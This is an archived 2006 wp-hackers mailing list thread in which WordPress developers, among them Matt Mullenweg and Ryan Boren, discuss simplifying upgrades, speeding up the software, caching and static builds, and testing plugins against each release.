References: <5a715c0a0602040539w63815d20n7e74e8218172a2fc@mail.gmail.com>
Message-ID: <43E76DED.7090805@atl.lmco.com>

Michael Heilemann wrote:
> Hey,
> 
> I've set up a discussion forum for the creation of Wiki tools for
> WordPress. If you're interested in participating in the creation of
> such, feel free to chime in.
> 
> Message Ends.
> 

As an addition to Michael's message, you may find all BB discussions at 
his forum, http://binarybonsai.com/forums.  The discussion in question 
resides here:
http://binarybonsai.com/forums/comments.php?DiscussionID=490


-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From m at mullenweg.com  Mon Feb  6 20:09:59 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon Feb  6 20:12:04 2006
Subject: [wp-hackers] Simplicity in 2.next
Message-ID: <43E7AD17.6060907@mullenweg.com>

The last thread about the next version of WP had some interesting ideas 
in it, but I think the question may have been framed the wrong way. What 
I'm far more interested in working on for the next version is this:

How can we make WordPress simpler in the next release?

How can we reduce support requests on the forums?

How can we make it faster?

(To riff on an idea, consider starting a new thread.)

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From VOGELAP at UCMAIL.UC.EDU  Mon Feb  6 20:22:59 2006
From: VOGELAP at UCMAIL.UC.EDU (Vogel, Andrew (vogelap))
Date: Mon Feb  6 20:24:28 2006
Subject: [wp-hackers] Simplicity in 2.next
Message-ID: <E7340445E0595A418B2F8DE0AE480E20097CEE60@ucmail6.ad.uc.edu>

One of the ways to make it simpler from the very start would be to make
it so the admin didn't need to disable plugins, delete WP files, upload
new WP files, and enable plugins on an upgrade. Maybe this is through a
master script that does it all behind the scenes, or maybe it is by some
other route.

When 2.0.1 was released, I attempted to upgraded my site which is
happily running 2.0 (www.drewvogel.com) to 2.0.1 and encountered
significant problems in the upgrade process that left me with a
non-functioning site and sent me scrambling back to 2.0.0 until I've got
time to get into it. Upgrades and installs should be drop-ins; the user
shouldn't be bothered by issues like disabling/enabling plugins through
an upgrade.

-andrew vogel
Manager of Professional Programs
University of Cincinnati
College of Pharmacy 
 

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> Matt Mullenweg
> Sent: Monday, February 06, 2006 3:10 PM
> To: wp-hackers@lists.automattic.com
> Subject: [wp-hackers] Simplicity in 2.next
> 
> The last thread about the next version of WP had some 
> interesting ideas in it, but I think the question may have 
> been framed the wrong way. What I'm far more interested in 
> working on for the next version is this:
> 
> How can we make WordPress simpler in the next release?
> 
> How can we reduce support requests on the forums?
> 
> How can we make it faster?
> 
> (To riff on an idea, consider starting a new thread.)
> 
> --
> Matt Mullenweg
>   http://photomatt.net | http://wordpress.org 
> http://automattic.com | http://akismet.com 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
From r at schestowitz.com  Mon Feb  6 20:26:06 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Mon Feb  6 20:25:39 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7AD17.6060907@mullenweg.com>
References: <43E7AD17.6060907@mullenweg.com>
Message-ID: <20060206202606.r2lfpij5xkow0c0s@banana.catalyst2.com>

_____/ On Mon 06 Feb 2006 20:09:59 GMT, [Matt Mullenweg] wrote : \_____

> The last thread about the next version of WP had some interesting 
> ideas in it, but I think the question may have been framed the wrong 
> way. What I'm far more interested in working on for the next version 
> is this:
>
> How can we make WordPress simpler in the next release?
>
> How can we reduce support requests on the forums?


In my opinion, bugs should take precedence, then compatibility (browser,
platform, and host testing) amd then comes the issue of extensibility
(simplicity -> user independence).


> How can we make it faster?


Faster to /use/? Or is it a matter of load handling? Or responsiveness? It's
a rope that you can always pull in different directions.


> (To riff on an idea, consider starting a new thread.)

From false.hopes at gmail.com  Mon Feb  6 20:36:40 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Feb  6 20:38:08 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7AD17.6060907@mullenweg.com>
References: <43E7AD17.6060907@mullenweg.com>
Message-ID: <a491f91d0602061236r2611bbb3p45fc616db7d4e8e2@mail.gmail.com>

A) Inline documentation, better documentation. Tutorials on getting
started with screencasts possibly (wasn't this discussed before?)

B) (Let the flames begin) Drop support for broken hosts and
environments. Have the installer do some safe mode checks, and if safe
mode is completely broken (like most setups of it are), set an option
that disables anything that might write to disk. This includes the
theme editors, the plugin editors, file uploading, caching, etc. There
comes a point where we're spending too much time working around broken
environments and not enough time actually working on adding and
updating features. 2.0 hit way above that mark in my opinion, and its
about time we move on.

Also in this category is dropping support for old MySQL versions, <
4.1, as their charset support is terrible, and is a cause of much
grief when moving around. Also, it may be smart for us to explicitly
declare a database charset as UTF-8 or similar, which will also help
cut down support requests.

C) Our own error controlling. Let's stop this now called "WSOD" mess
with our own error handling and logging, to make sure that context
appropriate error messages are displayed and that an admin is notified
when we are able to detect potentially serious problems. People are
coming to rely more and more upon the stability of WordPress, and each
horror story is a hit against potential users.

I'm sure I'll think of more soon.

--
--Robert Deaton
http://somethingunpredictable.com
From fuzzygroup at gmail.com  Mon Feb  6 20:40:44 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Mon Feb  6 20:43:55 2006
Subject: [wp-hackers] 2.next - faster
Message-ID: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>

Faster, imho, involves tradeoffs at this point. My gut just on web apps is
that faster means "look hard at the SQL".  For example I learned TONS about
mysql scaling at Feedster that I think is applicable but it starts to get
specialized like memcache support, write versus read servers, etc.,
seriously playing with your table structure, etc.

Faster in what environment???  I'm happy to contribute ideas but given the
spectrum of sites WP runs on this question has major ramifications

Scott

On 2/6/06, Roy Schestowitz <r@schestowitz.com> wrote:
>
> _____/ On Mon 06 Feb 2006 20:09:59 GMT, [Matt Mullenweg] wrote : \_____
>
> > The last thread about the next version of WP had some interesting
> > ideas in it, but I think the question may have been framed the wrong
> > way. What I'm far more interested in working on for the next version
> > is this:
> >
> > How can we make WordPress simpler in the next release?
> >
> > How can we reduce support requests on the forums?
>
>
> In my opinion, bugs should take precedence, then compatibility (browser,
> platform, and host testing) amd then comes the issue of extensibility
> (simplicity -> user independence).
>
>
> > How can we make it faster?
>
>
> Faster to /use/? Or is it a matter of load handling? Or responsiveness?
> It's
> a rope that you can always pull in different directions.
>
>
> > (To riff on an idea, consider starting a new thread.)
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



--
-------------------------------------------------------
J. Scott Johnson
Ookles launches 2/28/06 - have you signed up yet?
new startup: http://ookles.com/
blog: http://fuzzyblog.com/
podcast: http://techwarstories.com/
fuzzygroup@gmail.com
aim: fuzzygroup
cell: 857 222 6459
-------------------------------------------------------
From dmhouse at gmail.com  Mon Feb  6 20:48:46 2006
From: dmhouse at gmail.com (David House)
Date: Mon Feb  6 20:51:05 2006
Subject: [wp-hackers] 2.next - faster
In-Reply-To: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
Message-ID: <ebe43d680602061248h35d26151t@mail.gmail.com>

On 06/02/06, Scott johnson <fuzzygroup@gmail.com> wrote:
> Faster, imho, involves tradeoffs at this point. My gut just on web apps is
> that faster means "look hard at the SQL".  For example I learned TONS about
> mysql scaling at Feedster that I think is applicable but it starts to get
> specialized like memcache support, write versus read servers, etc.,
> seriously playing with your table structure, etc.

Most of the time taken for WordPress to load is down to the long time
needed for PHP to parse the thousands of lines of code, IIRC.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From jonabad at gmail.com  Mon Feb  6 20:53:17 2006
From: jonabad at gmail.com (Jon Abad)
Date: Mon Feb  6 20:54:52 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <a491f91d0602061236r2611bbb3p45fc616db7d4e8e2@mail.gmail.com>
References: <43E7AD17.6060907@mullenweg.com>
	<a491f91d0602061236r2611bbb3p45fc616db7d4e8e2@mail.gmail.com>
Message-ID: <43E7B73D.2020105@gmail.com>

Robert Deaton wrote:
> A) Inline documentation, better documentation. Tutorials on getting
> started with screencasts possibly (wasn't this discussed before?)
>   
>
Yes, I've volunteered for this on the responsibilities page and am eager 
to start whenever.
http://codex.wordpress.org/User:Matt/WordPress_Responsibilities


jon

From podz at tamba2.org.uk  Mon Feb  6 21:00:53 2006
From: podz at tamba2.org.uk (Podz)
Date: Mon Feb  6 21:01:58 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7AD17.6060907@mullenweg.com>
References: <43E7AD17.6060907@mullenweg.com>
Message-ID: <43E7B905.4000304@tamba2.org.uk>

Matt Mullenweg wrote:
> 
> How can we reduce support requests on the forums?
> 

As has been discussed elsewhere, as admirable a goal as this is all that
actually happens is that as you make WP more extensible more people want
to do more so they ask more - and round it goes :)

For the next version ? Test the hell out of the upgrade - there are an
awful lot of people who experienced problems in this upgrade and the
WSOD as mentioned here before hasn't helped.

Bounty hunt the bugs :)

P.
From r at schestowitz.com  Mon Feb  6 21:08:02 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Mon Feb  6 21:07:21 2006
Subject: [wp-hackers] 2.next - faster
In-Reply-To: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
Message-ID: <20060206210802.p8jow72mkvy84ooo@banana.catalyst2.com>

_____/ On Mon 06 Feb 2006 20:40:44 GMT, [Scott johnson] wrote : \_____

> On 2/6/06, Roy Schestowitz <r@schestowitz.com> wrote:
>>
>> _____/ On Mon 06 Feb 2006 20:09:59 GMT, [Matt Mullenweg] wrote : \_____
>>
>> > The last thread about the next version of WP had some interesting
>> > ideas in it, but I think the question may have been framed the wrong
>> > way. What I'm far more interested in working on for the next version
>> > is this:
>> >
>> > <snip />
>> >
>> > How can we make it faster?
>>
>>
>> Faster to /use/? Or is it a matter of load handling? Or responsiveness?
>> It's a rope that you can always pull in different directions.
>>
>> <snip />
>
> Faster, imho, involves tradeoffs at this point.


Yes, but the definition of "fast" is of importance here. I edit my PHP-Nuke
sites using WordPress because it is fast and responsive (well, it used to
be more of that). In terms of page delivery, all is merely the same, but
for content creation, WordPress is excellent. A previous message of mine
raised the possibility of adding keybindings, but judging by the silence,
many tend to disagree or disregard that.


> My gut just on web apps is
> that faster means "look hard at the SQL". For example I learned TONS about
> mysql scaling at Feedster that I think is applicable but it starts to get
> specialized like memcache support, write versus read servers, etc.,
> seriously playing with your table structure, etc.


The last point conflicts with backward compatibility, unless you consider
some opaque conversions.


> Faster in what environment???  I'm happy to contribute ideas but given the
> spectrum of sites WP runs on this question has major ramifications


One has to accept the fact that WordPress cannot remain feather-light,
assuming it extends to offer more hooks and keep up with flashy
technologies which the competition boasts.

I am admittedly among those who prefer Web-based bloatware at times,
especially if it obviates the need to run around the Web, collecting your
favourite 'bits', keeping them up-to-date (without interference) to create
a customised CMS 'distribution'.

Roy

-- 
Roy S. Schestowitz      |    "Oops. My brain just hit a bad sector"
http://Schestowitz.com  |    SuSE Linux     |     PGP-Key: 0x74572E8E
  9:00pm  up 20 days 16:16,  11 users,  load average: 0.42, 0.49, 0.53

From apakuni at gmail.com  Mon Feb  6 21:19:35 2006
From: apakuni at gmail.com (Douglas Daulton)
Date: Mon Feb  6 21:24:29 2006
Subject: [wp-hackers] 2.next - faster [flat/static build]
In-Reply-To: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
Message-ID: <C00CFD67.F46D%apakuni@gmail.com>

In addition to tweaking SQL, creating a native option for a flat/static
build (like Moveable Type) would reduce server load and increase SEO for WP
2.next.  There are some plug-ins out there that do this.  Why not look at
them all and build a "best of show" into the core.

This would have the added benefit of making WP more attractive to MT users
who need/want static builds.

DD


On 2/6/06 12:40 PM, "Scott johnson" <fuzzygroup@gmail.com> wrote:

> Faster, imho, involves tradeoffs at this point. My gut just on web apps is
> that faster means "look hard at the SQL".  For example I learned TONS about
> mysql scaling at Feedster that I think is applicable but it starts to get
> specialized like memcache support, write versus read servers, etc.,
> seriously playing with your table structure, etc.
> 
> Faster in what environment???  I'm happy to contribute ideas but given the
> spectrum of sites WP runs on this question has major ramifications
> 
> Scott

From apakuni at gmail.com  Mon Feb  6 21:24:03 2006
From: apakuni at gmail.com (Douglas Daulton)
Date: Mon Feb  6 21:25:46 2006
Subject: [wp-hackers] 2.next [install options]
In-Reply-To: <E7340445E0595A418B2F8DE0AE480E20097CEE60@ucmail6.ad.uc.edu>
Message-ID: <C00CFE73.F46F%apakuni@gmail.com>

I'll echo and expand on Drew's thought.

On install, provide an optional configuration screen which allows one to
disable and/or delete unwanted themes, plugins and files from the core
install.  

To keep the "5 minute install" intact, simply make a "Optional
Configuration" button on the page.   Folks can end the install or do all
options in one simple screen rather than jumping through the Admin UI for 20
minutes tweaking the install.

DD

On 2/6/06 12:22 PM, "Vogel, Andrew (vogelap)" <VOGELAP@UCMAIL.UC.EDU> wrote:

> One of the ways to make it simpler from the very start would be to make
> it so the admin didn't need to disable plugins, delete WP files, upload
> new WP files, and enable plugins on an upgrade. Maybe this is through a
> master script that does it all behind the scenes, or maybe it is by some
> other route.
> 
> When 2.0.1 was released, I attempted to upgraded my site which is
> happily running 2.0 (www.drewvogel.com) to 2.0.1 and encountered
> significant problems in the upgrade process that left me with a
> non-functioning site and sent me scrambling back to 2.0.0 until I've got
> time to get into it. Upgrades and installs should be drop-ins; the user
> shouldn't be bothered by issues like disabling/enabling plugins through
> an upgrade.
> 
> -andrew vogel
> Manager of Professional Programs
> University of Cincinnati
> College of Pharmacy
> 
> 
>> -----Original Message-----
>> From: wp-hackers-bounces@lists.automattic.com
>> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of
>> Matt Mullenweg
>> Sent: Monday, February 06, 2006 3:10 PM
>> To: wp-hackers@lists.automattic.com
>> Subject: [wp-hackers] Simplicity in 2.next
>> 
>> The last thread about the next version of WP had some
>> interesting ideas in it, but I think the question may have
>> been framed the wrong way. What I'm far more interested in
>> working on for the next version is this:
>> 
>> How can we make WordPress simpler in the next release?
>> 
>> How can we reduce support requests on the forums?
>> 
>> How can we make it faster?
>> 
>> (To riff on an idea, consider starting a new thread.)
>> 
>> --
>> Matt Mullenweg
>>   http://photomatt.net | http://wordpress.org
>> http://automattic.com | http://akismet.com
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers@lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From ryan at boren.nu  Mon Feb  6 21:27:32 2006
From: ryan at boren.nu (Ryan Boren)
Date: Mon Feb  6 21:29:05 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7B905.4000304@tamba2.org.uk>
References: <43E7AD17.6060907@mullenweg.com> <43E7B905.4000304@tamba2.org.uk>
Message-ID: <43E7BF44.1090605@boren.nu>

Podz wrote:
> Matt Mullenweg wrote:
> 
>>How can we reduce support requests on the forums?
>>
> 
> 
> As has been discussed elsewhere, as admirable a goal as this is all that
> actually happens is that as you make WP more extensible more people want
> to do more so they ask more - and round it goes :)
> 
> For the next version ? Test the hell out of the upgrade - there are an
> awful lot of people who experienced problems in this upgrade and the
> WSOD as mentioned here before hasn't helped.

Were there any upgrade problems not attributable to a plugin?  Every one 
I saw was attributable to a plugin that tripped over 1 of 2 small fixes 
that broke some expectations.

Ryan



From davebytes at comcast.net  Mon Feb  6 21:39:26 2006
From: davebytes at comcast.net (David Chait)
Date: Mon Feb  6 21:40:52 2006
Subject: [wp-hackers] 2.next - faster
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
	<ebe43d680602061248h35d26151t@mail.gmail.com>
Message-ID: <00d101c62b65$cdab88a0$6e01a8c0@sixfour>

As I mentioned in the earlier 2.next, maybe it is time to 'adopt' wp-cache 
(which is an offshoot of matt's own Staticize -- correct me if I'm recalling 
wrongly...) back into the core?  Even as a plugin, it'd be great.  If 
actually integrated, it should be an option (like the object cache should 
be).

Stats have shown wp-cache to be one of the biggest wins aside from purely 
static-page generation (or lightpress).

Any testing of ways to improve the speed of the non-cached system on general 
hosting (shared) would be good.  For instance, maybe one particular query 
being cached would make an impact, or adding a few keys here or there?

Also, discussion/testing of 'optional environments' would be good, 
especially if we can find hosts willing to 'play ball with us'.  I'm 
thinking specifically thttpd and/or lighttpd, which have proven speed over 
apache (and big, major sites use one of the two in many cases for static 
content, but they've proven useful for php as well...).

-d

----- Original Message ----- 
From: "David House" <dmhouse@gmail.com>
To: <wp-hackers@lists.automattic.com>
Sent: Monday, February 06, 2006 3:48 PM
Subject: Re: [wp-hackers] 2.next - faster


On 06/02/06, Scott johnson <fuzzygroup@gmail.com> wrote:
> Faster, imho, involves tradeoffs at this point. My gut just on web apps is
> that faster means "look hard at the SQL".  For example I learned TONS 
> about
> mysql scaling at Feedster that I think is applicable but it starts to get
> specialized like memcache support, write versus read servers, etc.,
> seriously playing with your table structure, etc.

Most of the time taken for WordPress to load is down to the long time
needed for PHP to parse the thousands of lines of code, IIRC.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From podz at tamba2.org.uk  Mon Feb  6 21:40:54 2006
From: podz at tamba2.org.uk (Podz)
Date: Mon Feb  6 21:42:01 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7BF44.1090605@boren.nu>
References: <43E7AD17.6060907@mullenweg.com> <43E7B905.4000304@tamba2.org.uk>
	<43E7BF44.1090605@boren.nu>
Message-ID: <43E7C266.9000309@tamba2.org.uk>

Ryan Boren wrote:

>> For the next version ? Test the hell out of the upgrade - there are an
>> awful lot of people who experienced problems in this upgrade and the
>> WSOD as mentioned here before hasn't helped.
> 
> Were there any upgrade problems not attributable to a plugin?  Every one
> I saw was attributable to a plugin that tripped over 1 of 2 small fixes
> that broke some expectations.
> 

You are probably right - but those 2 small fixes caused a lot of posts :)

P.
From m at mullenweg.com  Mon Feb  6 22:03:27 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon Feb  6 22:05:33 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <20060206202606.r2lfpij5xkow0c0s@banana.catalyst2.com>
References: <43E7AD17.6060907@mullenweg.com>
	<20060206202606.r2lfpij5xkow0c0s@banana.catalyst2.com>
Message-ID: <43E7C7AF.9060906@mullenweg.com>

Roy Schestowitz wrote:
> Faster to /use/? Or is it a matter of load handling? Or responsiveness? 
> It's
> a rope that you can always pull in different directions.

Perceived speed of use. For example doing pings asynchronously didn't 
actually speed them up, but to the user it means WP seems faster.

I think on the scaling/load side we're fine. What's needed there is 
mostly better documentation and guides.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From ryan at boren.nu  Mon Feb  6 22:05:29 2006
From: ryan at boren.nu (Ryan Boren)
Date: Mon Feb  6 22:06:55 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7C266.9000309@tamba2.org.uk>
References: <43E7AD17.6060907@mullenweg.com>
	<43E7B905.4000304@tamba2.org.uk>	<43E7BF44.1090605@boren.nu>
	<43E7C266.9000309@tamba2.org.uk>
Message-ID: <43E7C829.9040505@boren.nu>

Podz wrote:
> Ryan Boren wrote:
> 
> 
>>>For the next version ? Test the hell out of the upgrade - there are an
>>>awful lot of people who experienced problems in this upgrade and the
>>>WSOD as mentioned here before hasn't helped.
>>
>>Were there any upgrade problems not attributable to a plugin?  Every one
>>I saw was attributable to a plugin that tripped over 1 of 2 small fixes
>>that broke some expectations.
>>
> 
> 
> You are probably right - but those 2 small fixes caused a lot of posts :)

They needed to be fixed though.  We have enough plugins to make any 
change to the core likely to break one of them.

If someone wants to go through wp-plugins.org and test every plugin with 
each release, I'll try to fix any breakage found.  Vigilance over the 
plugin repository coupled with firefox style extension management would 
go a long way toward reducing plugin problems.  That's a real solution. 
  Automatically deactivating all plugins during upgrade and requiring 
manual reactivation is not a real solution.  That will guarantee 
everyone is annoyed rather than just a subset of people.

Ryan
From podz at tamba2.org.uk  Mon Feb  6 22:17:26 2006
From: podz at tamba2.org.uk (Podz)
Date: Mon Feb  6 22:18:36 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7C829.9040505@boren.nu>
References: <43E7AD17.6060907@mullenweg.com>	<43E7B905.4000304@tamba2.org.uk>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu>
Message-ID: <43E7CAF6.9010303@tamba2.org.uk>

Ryan Boren wrote:

> They needed to be fixed though.  We have enough plugins to make any
> change to the core likely to break one of them.
> 
> If someone wants to go through wp-plugins.org and test every plugin with
> each release, I'll try to fix any breakage found. 

How many plugins are there ?
How about setting up a number of blogs and installing plugins to them.
We'd need a few blogs hopefully over a few hosts and then they can be
used ? Is that feasible ? I'll happily set them up anywhere but the key
part is the plugins. Populating them with entries / images etc would be
a chore but if the end result would be used and used well then count me
in for doing it.

> Vigilance over the
> plugin repository coupled with firefox style extension management would
> go a long way toward reducing plugin problems.  That's a real solution.

Agreed.

P.
From nuclearmoose at gmail.com  Mon Feb  6 22:26:55 2006
From: nuclearmoose at gmail.com (Craig)
Date: Mon Feb  6 22:28:22 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7CAF6.9010303@tamba2.org.uk>
References: <43E7AD17.6060907@mullenweg.com> <43E7B905.4000304@tamba2.org.uk>
	<43E7BF44.1090605@boren.nu> <43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu> <43E7CAF6.9010303@tamba2.org.uk>
Message-ID: <5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>

So by testing plugins on wp-plugins.org, is this not setting up a defacto
set of official plugins since such a large number of plugins are hosted
elswhere, esp. on the authors' own sites? I suppose this might help
encourage folks to move their plugins to the repository, but I'm sure that
lots of plugin writers rather enjoy the traffic their site gets as a result
of their work.

Just thinkin' out loud!

Craig.
Nuclear Moose.
From m at mullenweg.com  Mon Feb  6 22:31:41 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon Feb  6 22:33:47 2006
Subject: [wp-hackers] 2.next - faster [flat/static build]
In-Reply-To: <C00CFD67.F46D%apakuni@gmail.com>
References: <C00CFD67.F46D%apakuni@gmail.com>
Message-ID: <43E7CE4D.1050104@mullenweg.com>

Douglas Daulton wrote:
> In addition to tweaking SQL, creating a native option for a flat/static
> build (like Moveable Type) would reduce server load and increase SEO for WP
> 2.next.  There are some plug-ins out there that do this.  Why not look at
> them all and build a "best of show" into the core.

Just to dispel a common misperception, there is NO SEO benefit by having 
static files as opposed to WP's nice permalinks. They both look "static" 
to search engines.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From podz at tamba2.org.uk  Mon Feb  6 22:35:00 2006
From: podz at tamba2.org.uk (Podz)
Date: Mon Feb  6 22:36:05 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
References: <43E7AD17.6060907@mullenweg.com>
	<43E7B905.4000304@tamba2.org.uk>	<43E7BF44.1090605@boren.nu>
	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>
	<43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
Message-ID: <43E7CF14.4000509@tamba2.org.uk>

Craig wrote:
> So by testing plugins on wp-plugins.org, is this not setting up a defacto
> set of official plugins since such a large number of plugins are hosted
> elswhere, esp. on the authors' own sites? I suppose this might help
> encourage folks to move their plugins to the repository, but I'm sure that
> lots of plugin writers rather enjoy the traffic their site gets as a result
> of their work.
> 

I'd say it's a place to start if nothing else. If it works out that
these blogs are worth the work then plugin authors could be asked - or
users be asked - to send the plugin for testing ?

What about they have a link at wp-plugins.org which goes to their page
for the actual code / info / post etc ? That way they get the credit /
traffic and also are seen in what could be the 'main location'. That's
close to what FF has ?

P.
From jonabad at gmail.com  Mon Feb  6 23:00:49 2006
From: jonabad at gmail.com (Jon Abad)
Date: Mon Feb  6 23:02:29 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7CF14.4000509@tamba2.org.uk>
References: <43E7AD17.6060907@mullenweg.com>	<43E7B905.4000304@tamba2.org.uk>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7CF14.4000509@tamba2.org.uk>
Message-ID: <43E7D521.4030402@gmail.com>

So far this sounds like it would be some sort of logo certification program?
I don't agree with that direction as it would require more manpower and 
would distract from the central mission of creating awesomeness. Please 
correct me if I'm wrong.


As I understand it, the FF model is that the extension states which 
versions they work with and then Firefox knows which are allowed to be 
turned on or not in order to prevent catastrophic failures or some such. 
The package can be opened and the max-version number upped to test with 
a new release but for the everyday user, they just wait for a new 
extension version to be announced.

At minimum, this sounds like it would be useful to us: add a 
WP-Version-Range line to the Plugin file structure so that people know 
which versions the plugin has been tested on. Maybe an alert could be 
given if the plugin hasn't been tested on the current version or simply 
not allow for the plugin to be turned on at all.

Pro: WP would know which plugins are compatible with its stated 
capabilities, hooks, etc.
Con: Support costs of the initial wave as plugins get tested and this 
new line added to it.
Con: How would old/abandoned plugins be dealt with? (Is this even a 
concern?)

Jon

Podz wrote:
> Craig wrote:
>   
>> So by testing plugins on wp-plugins.org, is this not setting up a defacto
>> set of official plugins since such a large number of plugins are hosted
>> elswhere, esp. on the authors' own sites? I suppose this might help
>> encourage folks to move their plugins to the repository, but I'm sure that
>> lots of plugin writers rather enjoy the traffic their site gets as a result
>> of their work.
>>
>>     
>
> I'd say it's a place to start if nothing else. If it works out that
> these blogs are worth the work then plugin authors could be asked - or
> users be asked - to send the plugin for testing ?
>
> What about they have a link at wp-plugins.org which goes to their page
> for the actual code / info / post etc ? That way they get the credit /
> traffic and also are seen in what could be the 'main location'. That's
> close to what FF has ?
>
> P.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>   
From wp at ebroder.net  Mon Feb  6 23:25:14 2006
From: wp at ebroder.net (Evan Broder)
Date: Mon Feb  6 23:26:34 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
References: <43E7AD17.6060907@mullenweg.com>
	<43E7B905.4000304@tamba2.org.uk>	<43E7BF44.1090605@boren.nu>
	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>
	<43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
Message-ID: <43E7DADA.4090700@ebroder.net>

I would expect that, if people don't already have their plugins 
currently hosted on wp-plugins.org, they aren't going to be easily 
convinced to move them.

I have a plugin that I host in my own webspace. It's a bit of a hassle 
when I release a new version, but wp-plugins.org is way overkill for my 
development setup. The wiki and Subversion are really overkill for what 
I need.

- Evan

Craig wrote:
> So by testing plugins on wp-plugins.org, is this not setting up a defacto
> set of official plugins since such a large number of plugins are hosted
> elswhere, esp. on the authors' own sites? I suppose this might help
> encourage folks to move their plugins to the repository, but I'm sure that
> lots of plugin writers rather enjoy the traffic their site gets as a result
> of their work.
>
> Just thinkin' out loud!
>
> Craig.
> Nuclear Moose.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>   
From apakuni at gmail.com  Mon Feb  6 23:25:36 2006
From: apakuni at gmail.com (Douglas Daulton)
Date: Mon Feb  6 23:27:09 2006
Subject: [wp-hackers] 2.next - faster [flat/static build]
In-Reply-To: <43E7CE4D.1050104@mullenweg.com>
Message-ID: <C00D1AF0.F482%apakuni@gmail.com>

Agreed.  However isn't there an SEO gain from parsing the static page
itself?  Happy to be educated to the contrary.

On 2/6/06 2:31 PM, "Matt Mullenweg" <m@mullenweg.com> wrote:

> Douglas Daulton wrote:
>> In addition to tweaking SQL, creating a native option for a flat/static
>> build (like Moveable Type) would reduce server load and increase SEO for WP
>> 2.next.  There are some plug-ins out there that do this.  Why not look at
>> them all and build a "best of show" into the core.
> 
> Just to dispel a common misperception, there is NO SEO benefit by having
> static files as opposed to WP's nice permalinks. They both look "static"
> to search engines.

From skeltoac at gmail.com  Mon Feb  6 23:27:12 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon Feb  6 23:28:38 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7D521.4030402@gmail.com>
References: <43E7AD17.6060907@mullenweg.com> <43E7B905.4000304@tamba2.org.uk>
	<43E7BF44.1090605@boren.nu> <43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu> <43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7CF14.4000509@tamba2.org.uk> <43E7D521.4030402@gmail.com>
